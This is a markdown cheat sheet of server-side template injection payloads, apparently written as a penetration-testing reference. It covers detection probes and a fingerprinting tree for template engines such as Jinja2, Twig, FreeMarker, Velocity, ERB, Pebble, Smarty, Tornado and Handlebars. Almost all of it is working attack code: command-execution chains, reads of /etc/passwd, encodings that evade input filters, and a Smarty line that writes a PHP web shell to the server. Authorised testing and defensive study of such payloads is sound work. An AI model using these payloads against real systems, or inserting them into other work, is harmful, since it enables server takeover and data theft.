# Server-Side Template Injection (SSTI) Payloads

> SSTI is one of the highest-impact web vulns — often leads directly to RCE.
> Detect first with math expressions. `{{7*7}}` → `49` confirms SSTI.

---

## Detection & Engine Fingerprinting

```
{{7*7}}           → 49 (Jinja2, Twig, Pebble)
${7*7}            → 49 (FreeMarker, Velocity, Thymeleaf)
<%= 7*7 %>        → 49 (ERB/Ruby)
#{7*7}            → 49 (Groovy, some others)
*{7*7}            → 49 (Spring/Thymeleaf)
{{7*'7'}}         → 49 vs 7777777 (distinguishes Jinja2 from Twig)
```

### Fingerprint Decision Tree
```
{{7*7}} = 49?
  ├── YES → Jinja2 or Twig
  │   ├── {{7*'7'}} = 49 → Jinja2
  │   └── {{7*'7'}} = 7777777 → Twig
  └── NO
      ├── ${7*7} = 49 → FreeMarker or Velocity
      │   ├── ${class.getResource("/")} works → FreeMarker
      │   └── #set($x=7*7)$x → Velocity
      └── <%= 7*7 %> = 49 → ERB (Ruby)
```

---

## Jinja2 (Python / Flask / Django)

### Basic Injection
```python
{{7*7}}
{{config}}
{{config.items()}}
{{self.__dict__}}
```

### Read Files
```python
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

# More reliable approach
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {% for b in c.__init__.__globals__.values() %}
      {% if b.__class__ == {}.__class__ %}
        {% if 'eval' in b.keys() %}
          {{ b['eval']('__import__("os").popen("cat /etc/passwd").read()') }}
        {% endif %}
      {% endif %}
    {% endfor %}
  {% endif %}
{% endfor %}
```

### RCE — Command Execution
```python
# Via Popen
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Via config + os module (Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Via lipsum global (Flask)
{{lipsum.__globals__["os"].popen("id").read()}}

# Shorter (Flask, Jinja2)
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}

# Via url_for (Flask)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Filter Bypass
```python
# Underscore bypass (use request.args)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# When dots are filtered
{{request|attr("application")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("id")|attr("read")()}}

# Pass via GET param to avoid detection in template
?name={{request.args.cmd}}&cmd=id
```

---

## Twig (PHP)

```php
{{7*7}}
{{_self}}
{{_self.env}}

# RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Via filter
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
```

---

## FreeMarker (Java)

```java
${7*7}
${freeMarker.version}

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Alternative
${"freemarker.template.utility.Execute"?new()("id")}

# Read file
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().text}
```

---

## Velocity (Java)

```java
#set($x=7*7)$x

# RCE
#set($rt=$class.forName("java.lang.Runtime"))
#set($e=$rt.getRuntime().exec("id"))
#set($inputStream=$e.getInputStream())
#set($bytes=$inputStream.available())
$inputStream.read()
```

---

## ERB (Ruby on Rails)

```erb
<%= 7*7 %>
<%= `id` %>
<%= system("id") %>
<%= IO.popen("id").readlines() %>
<% require 'open3' %><% stdout,stderr,status = Open3.capture3('id') %><%= stdout %>
```

---

## Pebble (Java)

```java
{{7*7}}
{{''.__class__}}

# RCE
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
   .forName('java.lang.Runtime')
   .methods[6]
   .invoke((1).TYPE.forName('java.lang.Runtime').methods[7].invoke(null),cmd)
   .inputStream.readAllBytes() %}
{{ bytes }}
```

---

## Smarty (PHP)

```php
{$smarty.version}
{php}echo id();{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

---

## Tornado (Python)

```python
{% import os %}{{os.system('id')}}
{% raw %}{{7*7}}{% end %}
{{escape(1)}}
```

---

## Handlebars (Node.js)

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Bypass Techniques

### Dot Notation Blocked
```python
# Jinja2 — use subscript
{{''['__class__']}}
{{''|attr('__class__')}}
{{request|attr('application')}}
```

### Underscores Blocked
```python
# Pass through GET parameter
?x={{request.args.y}}&y=__class__
{{''[request.args.y]}}

# Hex encode
{{''['\x5f\x5fclass\x5f\x5f']}}
```

### Keywords Blocked
```python
# Character concatenation
{{'__cla'+'ss__'}}
{{''['__cla''ss__']}}

# Encoding
{{'__class__'|lower}}
```
